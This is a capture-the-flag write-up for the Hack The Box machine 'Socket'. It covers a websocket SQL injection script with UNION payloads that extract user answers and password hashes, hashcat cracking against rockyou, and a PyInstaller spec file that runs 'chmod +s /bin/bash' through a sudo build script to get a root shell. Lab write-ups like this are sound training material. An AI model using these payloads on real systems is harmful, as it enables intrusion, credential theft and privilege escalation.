---
title: "Hack The Box - Socket [Medium]"
category: ctf-writeup
layout: post
---

So let's start with a rustscan of the machine

```bash
Open 10.10.11.206:22
Open 10.10.11.206:80
Open 10.10.11.206:5789
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 14:37 EEST
Initiating Ping Scan at 14:37
Scanning 10.10.11.206 [2 ports]
Completed Ping Scan at 14:37, 0.05s elapsed (1 total hosts)
Initiating Connect Scan at 14:37
Scanning qreader.htb (10.10.11.206) [3 ports]
Discovered open port 22/tcp on 10.10.11.206
Discovered open port 80/tcp on 10.10.11.206
Discovered open port 5789/tcp on 10.10.11.206
Completed Connect Scan at 14:37, 0.05s elapsed (3 total ports)
Nmap scan report for qreader.htb (10.10.11.206)
Host is up, received syn-ack (0.050s latency).
Scanned at 2023-04-21 14:37:19 EEST for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
5789/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```

I went to port 80 to check what is there, the idea of the website is to create QR Codes and extract text out of QR Codes, first I thought that maybe there is something with the QR codes but after some examination I decided to give up on that path and I went over the other things such as the Linux/Windows application.

Upon further discovery using `strings` over the linux binary, I realized that this a packaged exectuable that was created with `pyinstaller` so I've tried to unpack it with `uncompyle6` and then the `pyc` files with `pycdc`. 

I found out the following things from the source code of `qreader`:

```python
...
VERSION = '0.0.2'
ws_host = 'ws://ws.qreader.htb:5789'
...
def version(self):
        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
        if 'error' not in data.keys():
            version_info = data['message']
            msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''
            self.statusBar().showMessage(msg)
            return None
        error = None['error']
        self.statusBar().showMessage(error)

def update(self):
	response = asyncio.run(ws_connect(ws_host + '/update', json.dumps({
		'version': VERSION })))
	data = json.loads(response)
	if 'error' not in data.keys():
		msg = '[INFO] ' + data['message']
		self.statusBar().showMessage(msg)
		return None
	error = None['error']
	self.statusBar().showMessage(error)
```

This source code tries to connect to a websocket to get its version/update, so the paths for the websockets are:

```
ws://ws.qreader.htb:5789/update
ws://ws.qreader.htb:5789/version
```

I've tested both of these with `claws` tool. Then I crafted a python script to connect with the socket. 

> **_WARNING:_** Be really careful which quotes you are using, `'` or `"` because that could interfere with the SQLi that I found in the `version` path!

```python
from websockets.sync.client import connect
import json

with connect("ws://ws.qreader.htb:5789/version") as websocket:
    websocket.send(json.dumps({'version': '0.0.3" UNION SELECT group_concat(answer),2,3,4 from answers-- -'}))
    m = websocket.recv()
    print(m)
```

With this script, I've enumerated the tables, columns and the username with the following payloads:

```SQL
'0.0.3" UNION SELECT group_concat(answer),2,3,4 from answers-- -' -> This finds the user Thomas Keller
'0.0.3" UNION SELECT group_concat(password),2,3,4 from users-- -' -> This find the password hash
```

Cracking the password

```bash
$ hashcat -m 0 -a 0 0c090c365fa0559b151a43e0fea39710 ~/tools/rockyou.txt
<PASSWORD>
```

Getting the username with [adusergen](https://github.com/syrull/hacks/tree/main/adusergen)

```bash
$ echo -n "Thomas Keller" | adusergen

Thomas.Keller
ThomasKeller
KellerThomas
Keller.Thomas
Tkeller
T.keller
Thomas-Keller
T.keller
thomas.keller
thomaskeller
kellerthomas
keller.thomas
		tkeller <--- Right One
t.keller
thomas-keller
t.keller
```

# Root

The root was fairly easy, you just have to read the documentation for spec files for `pyinstaller`, after that I crafted the following spec file:

```python
block_cipher = __import__('os').system('chmod +s /bin/bash')
```

```bash
tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build priv.spec
105 INFO: PyInstaller: 5.6.2
105 INFO: Python: 3.10.6
107 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
110 INFO: UPX is not available.
script '/home/tkeller/minimal.py' not found
tkeller@socket:~$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt 
<HASH>
```
